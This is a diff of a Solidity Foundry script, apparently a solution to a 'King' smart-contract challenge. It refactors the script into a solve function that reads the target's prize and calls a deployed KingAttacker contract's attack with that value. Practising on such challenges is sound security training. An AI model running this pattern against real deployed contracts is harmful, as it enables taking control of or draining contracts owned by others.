@@ -11,10 +11,13 @@ contract KingSolution is Script {
         address mostRecentlyDeployedKingAttacker = DevOpsTools.get_most_recent_deployment("KingAttacker", block.chainid);
         console.log("KingAttacker address: ");
         console.logAddress(mostRecentlyDeployedKingAttacker);
+        solve(target, mostRecentlyDeployedKingAttacker);
+    }
+
+    function solve(address target, address attacker) public {
         King king = King(payable(target));
         uint256 currentPrice = king.prize();
-        KingAttacker kingAttacker = KingAttacker(payable(mostRecentlyDeployedKingAttacker));
-
+        KingAttacker kingAttacker = KingAttacker(payable(attacker));
         vm.startBroadcast();
         kingAttacker.attack{value: currentPrice}(target);
         vm.stopBroadcast();
